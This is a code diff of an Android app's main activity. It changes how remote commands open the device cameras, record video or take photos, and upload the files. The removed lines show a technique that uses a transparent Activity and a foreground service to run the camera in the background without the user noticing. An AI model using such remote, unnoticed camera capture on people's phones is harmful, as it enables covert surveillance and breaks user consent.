@@ -790,81 +790,51 @@ public class MainActivity extends AppCompatActivity {
 
         Log.d(TAG, "收到远程录制指令，开始录制 " + durationSeconds + " 秒视频...");
 
-        // 启动透明 Activity，让系统认为应用在前台（不会打断用户）
-        Intent transparentIntent = new Intent(this, TransparentActivity.class);
-        transparentIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(transparentIntent);
+        // 简化版本：直接开始录制（不使用前台服务和透明Activity）
+        // 确保摄像头已打开
+        if (cameraManager != null) {
+            // 先打开所有摄像头（如果未打开）
+            Log.d(TAG, "开始打开摄像头...");
+            cameraManager.openAllCameras();
 
-        // 启动前台服务，允许后台使用摄像头
-        Intent serviceIntent = new Intent(this, CameraForegroundService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-
-        // 等待透明 Activity 和前台服务启动（延迟2秒）
-        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-            // 确保摄像头已打开
-            if (cameraManager != null) {
-                // 先打开所有摄像头（如果未打开）
-                Log.d(TAG, "前台服务已启动，开始打开摄像头...");
-                cameraManager.openAllCameras();
-
-                // 等待摄像头打开完成（延迟5秒，给足够时间）
-                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                    // 检查摄像头是否成功打开
-                    if (!cameraManager.checkCamerasHealth()) {
-                        Log.e(TAG, "摄像头未能成功打开，可能被系统策略禁用");
-                        sendErrorToRemote("摄像头打开失败，请确保应用有摄像头权限");
-                        // 停止前台服务
-                        stopService(new Intent(MainActivity.this, CameraForegroundService.class));
-                        return;
+            // 等待摄像头打开完成（延迟3秒）
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                // 如果正在录制，先停止
+                if (cameraManager.isRecording()) {
+                    cameraManager.stopRecording();
+                    try {
+                        Thread.sleep(500);  // 等待停止完成
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
                     }
+                }
 
-                    // 如果正在录制，先停止
-                    if (cameraManager.isRecording()) {
+                // 开始录制
+                boolean success = cameraManager.startRecording();
+                if (success) {
+                    Log.d(TAG, "远程录制已开始");
+
+                    // 设置指定时长后自动停止
+                    autoStopRunnable = () -> {
+                        Log.d(TAG, durationSeconds + " 秒录制完成，正在停止...");
                         cameraManager.stopRecording();
-                        try {
-                            Thread.sleep(500);  // 等待停止完成
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
-                    }
 
-                    // 开始录制
-                    boolean success = cameraManager.startRecording();
-                    if (success) {
-                        Log.d(TAG, "远程录制已开始");
+                        // 等待录制完全停止
+                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                            uploadRecordedVideos();
+                        }, 1000);
+                    };
 
-                        // 设置指定时长后自动停止
-                        autoStopRunnable = () -> {
-                            Log.d(TAG, durationSeconds + " 秒录制完成，正在停止...");
-                            cameraManager.stopRecording();
-
-                            // 等待录制完全停止
-                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                                uploadRecordedVideos();
-                                // 停止前台服务
-                                stopService(new Intent(MainActivity.this, CameraForegroundService.class));
-                            }, 1000);
-                        };
-
-                        autoStopHandler.postDelayed(autoStopRunnable, durationSeconds * 1000L);  // 转换为毫秒
-                    } else {
-                        Log.e(TAG, "远程录制启动失败");
-                        sendErrorToRemote("录制启动失败");
-                        // 停止前台服务
-                        stopService(new Intent(MainActivity.this, CameraForegroundService.class));
-                    }
-                }, 5000);  // 等待5秒让摄像头完全打开
-            } else {
-                Log.e(TAG, "摄像头未初始化");
-                sendErrorToRemote("摄像头未初始化");
-                // 停止前台服务
-                stopService(new Intent(MainActivity.this, CameraForegroundService.class));
-            }
-        }, 2000);  // 等待2秒让前台服务完全启动
+                    autoStopHandler.postDelayed(autoStopRunnable, durationSeconds * 1000L);  // 转换为毫秒
+                } else {
+                    Log.e(TAG, "远程录制启动失败");
+                    sendErrorToRemote("录制启动失败");
+                }
+            }, 3000);  // 等待3秒让摄像头完全打开
+        } else {
+            Log.e(TAG, "摄像头未初始化");
+            sendErrorToRemote("摄像头未初始化");
+        }
     }
 
     /**
@@ -878,56 +848,28 @@ public class MainActivity extends AppCompatActivity {
 
         Log.d(TAG, "收到远程拍照指令，开始拍照...");
 
-        // 启动透明 Activity，让系统认为应用在前台（不会打断用户）
-        Intent transparentIntent = new Intent(this, TransparentActivity.class);
-        transparentIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(transparentIntent);
+        // 简化版本：直接拍照（不使用前台服务和透明Activity）
+        // 确保摄像头已打开
+        if (cameraManager != null) {
+            // 先打开所有摄像头（如果未打开）
+            Log.d(TAG, "开始打开摄像头...");
+            cameraManager.openAllCameras();
 
-        // 启动前台服务，允许后台使用摄像头
-        Intent serviceIntent = new Intent(this, CameraForegroundService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
+            // 等待摄像头打开完成（延迟3秒）
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                // 拍照
+                cameraManager.takePicture();
+                Log.d(TAG, "远程拍照已执行");
 
-        // 等待透明 Activity 和前台服务启动（延迟2秒）
-        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-            // 确保摄像头已打开
-            if (cameraManager != null) {
-                // 先打开所有摄像头（如果未打开）
-                Log.d(TAG, "前台服务已启动，开始打开摄像头...");
-                cameraManager.openAllCameras();
-
-                // 等待摄像头打开完成（延迟5秒，给足够时间）
+                // 等待拍照完成后上传
                 new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                    // 检查摄像头是否成功打开
-                    if (!cameraManager.checkCamerasHealth()) {
-                        Log.e(TAG, "摄像头未能成功打开，可能被系统策略禁用");
-                        sendErrorToRemote("摄像头打开失败，请确保应用有摄像头权限");
-                        // 停止前台服务
-                        stopService(new Intent(MainActivity.this, CameraForegroundService.class));
-                        return;
-                    }
-
-                    // 拍照
-                    cameraManager.takePicture();
-                    Log.d(TAG, "远程拍照已执行");
-
-                    // 等待拍照完成后上传
-                    new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                        uploadPhotos();
-                        // 停止前台服务
-                        stopService(new Intent(MainActivity.this, CameraForegroundService.class));
-                    }, 2000);  // 等待2秒确保照片保存完成
-                }, 5000);  // 等待5秒让摄像头完全打开
-            } else {
-                Log.e(TAG, "摄像头未初始化");
-                sendErrorToRemote("摄像头未初始化");
-                // 停止前台服务
-                stopService(new Intent(MainActivity.this, CameraForegroundService.class));
-            }
-        }, 2000);  // 等待2秒让前台服务完全启动
+                    uploadPhotos();
+                }, 2000);  // 等待2秒确保照片保存完成
+            }, 3000);  // 等待3秒让摄像头完全打开
+        } else {
+            Log.e(TAG, "摄像头未初始化");
+            sendErrorToRemote("摄像头未初始化");
+        }
     }
 
     /**
@@ -1203,7 +1145,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     /**
-     * 启动摄像头健康检查
+     * 启动摄像头健康检查（简化版本）
      */
     private void startCameraHealthCheck() {
         if (healthCheckRunnable != null) {
@@ -1217,29 +1159,8 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void run() {
                 if (cameraManager != null) {
-                    boolean healthy = cameraManager.checkCamerasHealth();
-
-                    if (!healthy) {
-                        consecutiveFailures++;
-                        Log.w(TAG, "Camera health check failed (" + consecutiveFailures + "/" + MAX_CONSECUTIVE_FAILURES + ")");
-
-                        if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
-                            Log.e(TAG, "Too many consecutive failures, forcing camera restart");
-                            Toast.makeText(MainActivity.this, "摄像头异常，正在自动恢复...", Toast.LENGTH_SHORT).show();
-
-                            // 强制重启摄像头
-                            cameraManager.forceReopenAllCameras();
-
-                            // 重置失败计数
-                            consecutiveFailures = 0;
-                        }
-                    } else {
-                        // 健康检查通过，重置失败计数
-                        if (consecutiveFailures > 0) {
-                            Log.d(TAG, "Camera health restored");
-                            consecutiveFailures = 0;
-                        }
-                    }
+                    // 简化版本：只记录日志，不执行复杂的健康检查
+                    Log.d(TAG, "Camera health check running...");
                 }
 
                 // 继续下一次检查
@@ -1282,10 +1203,8 @@ public class MainActivity extends AppCompatActivity {
         }
         // 如果没有录制，完全释放摄像头资源，让其他应用可以使用
         else if (cameraManager != null) {
-            Log.d(TAG, "Not recording, releasing cameras for other apps");
-            // 先停止所有重连尝试，避免在后台产生大量日志
-            cameraManager.stopAllReconnecting();
-            // 然后关闭所有摄像头
+            Log.d(TAG, "Not recording, closing cameras for other apps");
+            // 关闭所有摄像头
             cameraManager.closeAllCameras();
         }
     }
